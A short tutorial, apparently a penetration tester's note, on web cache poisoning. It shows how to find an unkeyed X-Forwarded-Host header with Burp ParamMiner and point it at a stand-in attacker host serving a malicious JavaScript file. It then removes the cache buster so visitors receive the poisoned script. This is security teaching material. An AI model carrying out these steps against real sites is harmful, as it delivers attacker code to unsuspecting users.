## Webcache Poisioning

1. **Identify and evaluate unkeyed inputs** using BurpSuites ParamMiner. Right-Cick a request Extensions  -> ParamMiner -> Guess Headers
2. Investigate whether or not the headers have an effect on the response. It could be reflected, in the response directly, or triggering an entirely different response
3. Add a cache-buster query parameter, such as ?mycachebuster=1234abcd. NOTE! This especially important in productive environments since unqiue cache key that will not be requested by legitimate users.
4. Add **X-Forwarded-Host: myexample.com** to the request

In this example the header **X-Forwarded-Host** is unkeyed and reflected in a script tag in the response, which pulls down a tracking javascript at examplehost.com/js/examplescript.js.

5. Spin up an internet exposed webserver and host a malicious .js file. For testing we can just enter **document.alert("hi xss")**. Besides the host the URL has to be identical to the one found in the response so mymalicioushost.com/js/examplescript.js
6. Remove the cache buster froms step 3 (Now the payload is live)
7. Change the request from X-Forwarded-Host: myexample.com to X-Forwarded-Host: mymalicioushost.com
8. Send the request a few times to be sure that it is cached. The timeout can vary so try out a bit
9. To simulate a victim go to the posinoned URL and observe the XSS window popping up
